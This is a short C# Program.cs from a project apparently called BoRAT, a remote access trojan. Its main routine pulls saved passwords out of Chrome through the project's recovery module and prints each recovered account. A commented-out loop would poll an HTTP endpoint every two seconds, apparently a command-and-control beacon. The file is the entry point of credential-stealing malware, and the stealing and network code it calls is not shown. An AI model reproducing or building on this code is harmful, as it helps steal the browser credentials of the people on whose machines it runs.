using System;
using System.Threading;
using BoRAT.Core.Network;
using BoRAT.Core.Recovery.Browsers;

namespace BoRAT
{
    class Program
    {
        static void Main(string[] args)
        {
            foreach (RecoveredAccount acc in Chrome.GetSavedPasswords())
                Console.Write(acc.ToString());
            //while(true)
            //{
            //    Http.Request();
            //    Thread.Sleep(2000);
            //}

            Console.ReadKey();
        }

      
    }
}
